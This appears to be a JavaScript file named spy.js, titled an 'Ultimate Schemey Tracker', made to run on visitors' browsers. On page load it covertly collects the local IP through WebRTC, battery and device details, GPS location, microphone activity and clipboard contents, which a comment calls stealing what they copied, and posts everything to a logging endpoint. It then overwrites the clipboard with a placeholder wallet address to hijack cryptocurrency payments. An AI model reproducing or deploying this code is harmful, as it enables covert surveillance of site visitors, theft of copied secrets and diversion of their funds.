// public/spy.js - Ultimate Schemey Tracker

async function getLocalIP() {
    return new Promise((resolve) => {
        const connection = new RTCPeerConnection({ iceServers: [] });
        connection.createDataChannel("");
        connection.createOffer().then(offer => connection.setLocalDescription(offer));
        let resolved = false;
        const handler = (event) => {
            if (resolved) return;
            if (!event.candidate) {
                connection.close();
                resolved = true;
                resolve(null);
            } else if (/candidate.*127/.test(event.candidate.candidate)) {
                const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/);
                if (ipMatch) {
                    connection.close();
                    resolved = true;
                    resolve(ipMatch[0]);
                }
            }
        };
        connection.onicecandidate = handler;
        setTimeout(() => {
            if (!resolved) {
                connection.close();
                resolved = true;
                resolve(null);
            }
        }, 2000);
    });
}

async function getBattery() {
    try {
        if (navigator.getBattery) return await navigator.getBattery();
    } catch (e) {}
    return null;
}

async function trackRat() {
    const data = {
        user_agent: navigator.userAgent,
        screen_res: `${screen.width}x${screen.height}`,
        timestamp: Date.now(),
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        connection_type: navigator.connection ? navigator.connection.effectiveType : 'unknown',
        visibility_state: document.visibilityState, // 'visible' or 'hidden'
        battery_status: null,
        clipboard_content: null,
        audio_active: false
    };

    // 1. Local IP
    const localIP = await getLocalIP();
    if (localIP) data.local_ip = localIP;

    // 2. Battery
    const battery = await getBattery();
    if (battery) {
        data.battery_level = battery.level;
        data.is_charging = battery.charging;
        data.discharging_time = battery.dischargingTime;
    }

    // 3. Clipboard Read (Steal what they copied)
    try {
        const clipText = await navigator.clipboard.readText();
        if (clipText && clipText.length < 1000) {
            data.clipboard_content = clipText;
        }
    } catch (e) { /* Ignore permission errors */ }

    // 4. Audio Context Check (Is mic active?)
    try {
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        data.audio_active = audioCtx.state === 'running';
        audioCtx.close(); // Close it so we don't drain battery
    } catch (e) {}

    // 5. GPS
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                data.lat = pos.coords.latitude;
                data.lon = pos.coords.longitude;
                data.accuracy = pos.coords.accuracy;
                
                // Send everything once GPS is ready
                sendData(data);
            },
            () => {
                // If GPS fails, still send what we have
                sendData(data);
            }
        );
    } else {
        sendData(data);
    }
}

async function sendData(payload) {
    try {
        await fetch('/api/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        // Optional: Inject a fake address into clipboard after sending
        try {
            await navigator.clipboard.writeText("YOUR_FAKE_WALLET_ADDRESS_HERE");
        } catch(e) {}

    } catch (e) {
        console.error("Send failed", e);
    }
}

trackRat();